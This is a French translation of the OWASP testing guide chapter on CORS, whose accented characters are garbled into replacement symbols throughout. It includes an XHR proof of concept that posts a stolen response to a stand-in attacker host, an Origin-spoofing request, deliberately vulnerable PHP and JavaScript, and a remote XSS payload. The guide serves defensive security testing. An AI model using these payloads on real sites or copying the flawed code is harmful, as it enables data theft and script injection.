# Tester le partage de ressources inter-origines

|ID          |
|------------|
|WSTG-CLNT-07|

## Sommaire

[Cross Origin Resource Sharing](https://en.wikipedia.org/wiki/Cross-origin_resource_sharing) (CORS) est un m�canisme qui permet � un navigateur Web d'effectuer des requ�tes interdomaines � l'aide de XMLHttpRequest (XHR) niveau 2 (L2 ) API de mani�re contr�l�e. Dans le pass�, l'API XHR L1 n'autorisait que l'envoi de requ�tes au sein de la m�me origine, car elle �tait restreinte par la [Same Origin Policy](https://developer.mozilla.org/en-US/docs/Web/Security/ Same-origin_policy) (SOP).

Les requ�tes cross-origin ont un en-t�te "Origin" qui identifie le domaine � l'origine de la requ�te et est toujours envoy� au serveur. CORS d�finit le protocole � utiliser entre un navigateur Web et un serveur pour d�terminer si une requ�te cross-origin est autoris�e. Les [en-t�tes] HTTP (https://en.wikipedia.org/wiki/Cross-origin_resource_sharing#Headers) sont utilis�s pour accomplir cela.

La [sp�cification W3C CORS](https://www.w3.org/TR/cors/) stipule que pour les requ�tes non simples, telles que les requ�tes autres que GET ou POST ou les requ�tes utilisant des informations d'identification, une requ�te OPTIONS avant le vol doit �tre envoy� � l'avance pour v�rifier si le type de demande aura un impact n�gatif sur les donn�es. La requ�te pr�liminaire v�rifie les m�thodes et les en-t�tes autoris�s par le serveur, et si les informations d'identification sont autoris�es. En fonction du r�sultat de la requ�te OPTIONS, le navigateur d�cide si la requ�te est autoris�e ou non.

### Origine et contr�le d'acc�s-Autoriser l'origine

L'en-t�te de requ�te "Origin" est toujours envoy� par le navigateur dans une requ�te CORS et indique l'origine de la requ�te. L'en-t�te Origin ne peut pas �tre modifi� � partir de JavaScript car [le navigateur (l'agent utilisateur) bloque sa modification](https://developer.mozilla.org/en-US/docs/Glossary/Forbidden_header_name)�; cependant, se fier � cet en-t�te pour les v�rifications de contr�le d'acc�s n'est pas une bonne id�e car il peut �tre usurp� en dehors du navigateur, par exemple en utilisant un proxy, vous devez donc toujours v�rifier que les protocoles au niveau de l'application sont utilis�s pour prot�ger les donn�es sensibles.

`Access-Control-Allow-Origin` est un en-t�te de r�ponse utilis� par un serveur pour indiquer quels domaines sont autoris�s � lire la r�ponse. Sur la base de la sp�cification CORS W3, il appartient au client de d�terminer et d'appliquer la restriction d'acc�s du client aux donn�es de r�ponse bas�es sur cet en-t�te.

Du point de vue des tests de s�curit�, vous devez rechercher des configurations non s�curis�es, par exemple en utilisant un caract�re g�n�rique `*` comme valeur de l'en-t�te `Access-Control-Allow-Origin`, ce qui signifie que tous les domaines sont autoris�s. Un autre exemple non s�curis� est lorsque le serveur renvoie l'en-t�te d'origine sans aucune v�rification suppl�mentaire, ce qui peut conduire � l'acc�s � des donn�es sensibles. Notez que la configuration permettant d'autoriser les requ�tes cross-origin est tr�s peu s�curis�e et n'est pas acceptable de mani�re g�n�rale, sauf dans le cas d'une API publique qui se veut accessible � tous.

### Access-Control-Request-Method & Access-Control-Allow-Method

L'en-t�te "Access-Control-Request-Method" est utilis� lorsqu'un navigateur effectue une requ�te OPTIONS en amont et permet au client d'indiquer la m�thode de requ�te de la requ�te finale. D'autre part, le `Access-Control-Allow-Method` est un en-t�te de r�ponse utilis� par le serveur pour d�crire les m�thodes que les clients sont autoris�s � utiliser.

### Access-Control-Request-Headers & Access-Control-Allow-Headers

Ces deux en-t�tes sont utilis�s entre le navigateur et le serveur pour d�terminer quels en-t�tes peuvent �tre utilis�s pour effectuer une requ�te cross-origin.

### Access-Control-Allow-Credentials

Cet en-t�te de r�ponse permet aux navigateurs de lire la r�ponse lorsque les informations d'identification sont transmises. Lorsque l'en-t�te est envoy�, l'application Web doit d�finir une origine sur la valeur de l'en-t�te "Access-Control-Allow-Origin". L'en-t�te `Access-Control-Allow-Credentials` ne peut pas �tre utilis� avec l'en-t�te `Access-Control-Allow-Origin` dont la valeur est le caract�re g�n�rique `*` comme suit�:

```http
Access-Control-Allow-Origin: *
Access-Control-Allow-Credentials: true
```

### Validation des entr�es

XHR L2 introduit la possibilit� de cr�er une requ�te interdomaine � l'aide de l'API XHR pour une compatibilit� descendante. Cela peut introduire des vuln�rabilit�s de s�curit� qui n'�taient pas pr�sentes dans XHR L1. Les points int�ressants du code � exploiter seraient les URL qui sont pass�es � XMLHttpRequest sans validation, surtout si les URL absolues sont autoris�es car cela pourrait conduire � une injection de code. De m�me, une autre partie de l'application qui peut �tre exploit�e est si les donn�es de r�ponse ne sont pas �chapp�es et nous pouvons les contr�ler en fournissant une entr�e fournie par l'utilisateur.

### Autres en-t�tes

D'autres en-t�tes sont impliqu�s, tels que "Access-Control-Max-Age", qui d�termine l'heure � laquelle une demande de contr�le en amont peut �tre mise en cache dans le navigateur, ou "Access-Control-Expose-Headers", qui indique quels en-t�tes peuvent �tre expos�s en toute s�curit� � l'API. d'une sp�cification d'API CORS.

Pour consulter les en-t�tes CORS, reportez-vous au [document CORS MDN](https://developer.mozilla.org/en-US/docs/Web/HTTP/CORS#The_HTTP_response_headers).

## Objectifs des tests

- Identifier les terminaux qui impl�mentent CORS.
- Assurez-vous que la configuration CORS est s�curis�e ou inoffensive.

## Comment tester

Un outil tel que [ZAP](https://www.zaproxy.org) peut permettre aux testeurs d'intercepter les en-t�tes HTTP, ce qui peut r�v�ler comment CORS est utilis�. Les testeurs doivent porter une attention particuli�re � l'en-t�te d'origine pour savoir quels domaines sont autoris�s. De plus, dans certains cas, une inspection manuelle du JavaScript est n�cessaire pour d�terminer si le code est vuln�rable � l'injection de code en raison d'une mauvaise gestion des entr�es fournies par l'utilisateur.

### Mauvaise configuration CORS

La d�finition du caract�re g�n�rique sur l'en-t�te "Access-Control-Allow-Origin" (c'est-�-dire "Access-Control-Allow-Origin�:�*") n'est pas s�curis�e si la r�ponse contient des informations sensibles. Bien qu'il ne puisse pas �tre utilis� avec `Access-Control-Allow-Credentials: true` en m�me temps, il peut �tre dangereux lorsque le contr�le d'acc�s est effectu� uniquement par les r�gles de pare-feu ou les adresses IP source, autre que d'�tre prot�g� par des informations d'identification .

#### Wildcard Access-Control-Allow-Origin

Un testeur peut v�rifier si `Access-Control-Allow-Origin: *` existe dans les messages de r�ponse HTTP.

```http
HTTP/1.1 200 OK
[...]
Access-Control-Allow-Origin: *
Content-Length: 4
Content-Type: application/xml

[Response Body]
```

Si une r�ponse contient des donn�es sensibles, un attaquant peut les voler en utilisant XHR�:

```html
<html>
    <head></head>
    <body>
        <script>
            var xhr = new XMLHttpRequest();
            xhr.onreadystatechange = function() {
                if (this.readyState == 4 && this.status == 200) {
                    var xhr2 = new XMLHttpRequest();
                    // attacker.server: attacker listener to steal response
                    xhr2.open("POST", "http://attacker.server", true);
                    xhr2.send(xhr.responseText);
                }
            };
            // victim.site: vulnerable server with `Access-Control-Allow-Origin: *` header 
            xhr.open("GET", "http://victim.site", true);
            xhr.send();
        </script>
    </body>
</html>
```

#### Politique CORS dynamique

Une application Web ou une API moderne peut �tre impl�ment�e pour autoriser dynamiquement les requ�tes cross-origin, g�n�ralement afin d'autoriser les requ�tes des sous-domaines comme suit�:

```php
if (preg_match('|\.exemple.com$|', $_SERVER['SERVER_NAME'])) {
   header("Access-Control-Allow-Origin: {$_SERVER['HTTP_ORIGIN']}");
   ...
}
```

Dans cet exemple, toutes les requ�tes provenant des sous-domaines de exemple.com seront autoris�es. Il faut s'assurer que l'expression r�guli�re utilis�e pour la correspondance est compl�te. Sinon, s'il correspondait simplement � `exemple.com` (sans `$` ajout�), les attaquants pourraient contourner la politique CORS en ajoutant leur domaine � l'en-t�te `Origin`.

```http
GET /test.php HTTP/1.1
Host: exemple.com
[...]
Origin: http://exemple.com.attacker.com
Cookie: <session cookie>
```

Lorsque la requ�te ci-dessus est envoy�e, si la r�ponse suivante est renvoy�e avec le `Access-Control-Allow-Origin` dont la valeur est la m�me que l'entr�e de l'attaquant, l'attaquant peut lire la r�ponse par la suite et acc�der aux informations sensibles qui ne sont accessibles que par un utilisateur victime.

```http
HTTP/1.1 200 OK
[...]
Access-Control-Allow-Origin: http://exemple.com.attacker.com
Access-Control-Allow-Credentials: true
Content-Length: 4
Content-Type: application/xml

[Response Body]
```

### Faiblesse de la validation des entr�es

Le concept CORS peut �tre vu sous un angle compl�tement diff�rent. Un attaquant peut autoriser d�lib�r�ment sa politique CORS � injecter du code dans l'application Web cible.

#### XSS � distance avec CORS

Ce code fait une requ�te � la ressource pass�e apr�s le caract�re `#` dans l'URL, initialement utilis� pour obtenir des ressources dans le m�me serveur.

Code vuln�rable�:

```html
<script>
    var req = new XMLHttpRequest();

    req.onreadystatechange = function() {
        if(req.readyState==4 && req.status==200) {
            document.getElementById("div1").innerHTML=req.responseText;
        }
    }

    var resource = location.hash.substring(1);
    req.open("GET",resource,true);
    req.send();
</script>

<body>
    <div id="div1"></div>
</body>
```

Par exemple, une requ�te comme celle-ci affichera le contenu du fichier `profile.php`�:

`http://exemple.foo/main.php#profile.php`

Requ�te et r�ponse g�n�r�es par `http://exemple.foo/profile.php`�:

```html
GET /profile.php HTTP/1.1
Host: exemple.foo
[...]
Referer: http://exemple.foo/main.php
Connection: keep-alive

HTTP/1.1 200 OK
[...]
Content-Length: 25
Content-Type: text/html

[Response Body]
```

Maintenant, comme il n'y a pas de validation d'URL, nous pouvons injecter un script distant, qui sera inject� et ex�cut� dans le contexte du domaine `exemple.foo`, avec une URL comme celle-ci�:

```text
http://exemple.foo/main.php#http://attacker.bar/file.php
```

Requ�te et r�ponse g�n�r�es par `http://attacker.bar/file.php`�:

```html
GET /file.php HTTP/1.1
Host: attacker.bar
[...]
Referer: http://exemple.foo/main.php
origin: http://exemple.foo

HTTP/1.1 200 OK
[...]
Access-Control-Allow-Origin: *
Content-Length: 92
Content-Type: text/html

Injected Content from attacker.bar <img src="#" onerror="alert('Domain: '+document.domain)">
```

## R�f�rences

- [Fiche de triche de s�curit� OWASP HTML5] (https://cheatsheetseries.owasp.org/cheatsheets/HTML5_Security_Cheat_Sheet.html#cross-origin-resource-sharing)
- [Partage de ressources cross-origin MDN](https://developer.mozilla.org/en-US/docs/Web/HTTP/CORS)
